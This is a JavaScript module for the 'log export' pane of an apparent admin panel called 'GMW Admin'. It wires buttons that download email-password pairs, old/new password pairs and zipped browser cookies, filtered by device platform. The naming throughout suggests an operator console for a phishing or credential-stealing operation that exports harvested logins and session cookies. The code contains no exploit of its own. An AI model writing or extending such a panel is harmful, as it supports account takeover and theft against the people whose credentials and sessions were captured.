/** Config modal — pane «Выгрузка логов» (#config-pane-export). Loaded before admin.js; wired from initConfigModal. */
(function (global) {
  'use strict';

  /**
   * @param {function(string, object=): Promise<Response>} authFetch — same helper as in admin.js (401/403 → /admin-login)
   */
  function initAdminConfigPaneExport(authFetch) {
    if (typeof authFetch !== 'function') return;
    function bindClickOnce(el, key, handler) {
      if (!el || typeof el.addEventListener !== 'function' || typeof handler !== 'function') return;
      var guardKey = '__gmwBound_' + key;
      if (el[guardKey]) return;
      el[guardKey] = true;
      el.addEventListener('click', handler);
    }

    function getExportPlatforms() {
      var ids = ['export-platform-windows', 'export-platform-macos', 'export-platform-android', 'export-platform-ios', 'export-platform-unknown'];
      var out = [];
      ids.forEach(function (id) {
        var el = document.getElementById(id);
        if (el && el.checked) out.push(id.replace('export-platform-', ''));
      });
      return out;
    }

    function downloadExport(type, defaultFilename) {
      var platforms = getExportPlatforms();
      var url = '/api/export-logs?type=' + encodeURIComponent(type);
      if (platforms.length) url += '&platforms=' + encodeURIComponent(platforms.join(','));
      authFetch(url)
        .then(function (r) {
          if (!r.ok) return r.text().then(function (t) { return Promise.reject(new Error(t || r.statusText)); });
          return r.blob().then(function (blob) {
            var disp = r.headers.get('Content-Disposition');
            var name = defaultFilename;
            if (disp) {
              var m = disp.match(/filename="([^"]+)"/);
              if (m) name = m[1];
            }
            var blobUrl = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = blobUrl;
            a.download = name;
            a.rel = 'noopener';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(blobUrl);
          });
        })
        .catch(function (err) {
          console.error('[GMW Admin] export-logs:', err);
          alert('Ошибка выгрузки: ' + (err.message || 'Network error'));
        });
    }

    var exportCredentials = document.getElementById('export-logs-credentials');
    var exportAllEmails = document.getElementById('export-logs-all-emails');
    var exportAllEmailPass = document.getElementById('export-logs-all-email-pass');
    var exportOldNew = document.getElementById('export-logs-old-new');
    bindClickOnce(exportCredentials, 'exportCredentials', function () { downloadExport('credentials', 'logs-email-password.txt'); });
    bindClickOnce(exportAllEmails, 'exportAllEmails', function () { downloadExport('all_emails', 'logs-emails.txt'); });
    bindClickOnce(exportAllEmailPass, 'exportAllEmailPass', function () { downloadExport('all_email_pass', 'logs-all-email-pass.txt'); });
    bindClickOnce(exportOldNew, 'exportOldNew', function () { downloadExport('all_email_old_new', 'logs-email-old-new.txt'); });

    function downloadCookiesExport(mode) {
      var url = '/api/config/cookies-export?mode=' + encodeURIComponent(mode);
      authFetch(url)
        .then(function (r) {
          var ct = r.headers.get('Content-Type') || '';
          if (ct.indexOf('application/json') !== -1) {
            return r.json().then(function (body) {
              if (body && body.ok === false && body.error) {
                alert(body.error);
              } else {
                alert('Ошибка: ' + (body && body.error ? body.error : r.statusText));
              }
            });
          }
          return r.blob().then(function (blob) {
            var disp = r.headers.get('Content-Disposition');
            var name = mode === 'new' ? 'cookies-new.zip' : 'cookies-all.zip';
            if (disp) {
              var m = disp.match(/filename="([^"]+)"/);
              if (m) name = m[1];
            }
            var blobUrl = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = blobUrl;
            a.download = name;
            a.rel = 'noopener';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(blobUrl);
          });
        })
        .catch(function (err) {
          alert('Ошибка выгрузки куки: ' + (err.message || 'Network error'));
        });
    }

    var exportCookiesAll = document.getElementById('export-cookies-all');
    var exportCookiesNew = document.getElementById('export-cookies-new');
    var exportCookiesForce = document.getElementById('export-cookies-force');
    bindClickOnce(exportCookiesAll, 'exportCookiesAll', function () { downloadCookiesExport('all'); });
    bindClickOnce(exportCookiesNew, 'exportCookiesNew', function () { downloadCookiesExport('new'); });
    bindClickOnce(exportCookiesForce, 'exportCookiesForce', function () { downloadCookiesExport('force'); });
  }

  global.initAdminConfigPaneExport = initAdminConfigPaneExport;
})(typeof window !== 'undefined' ? window : this);
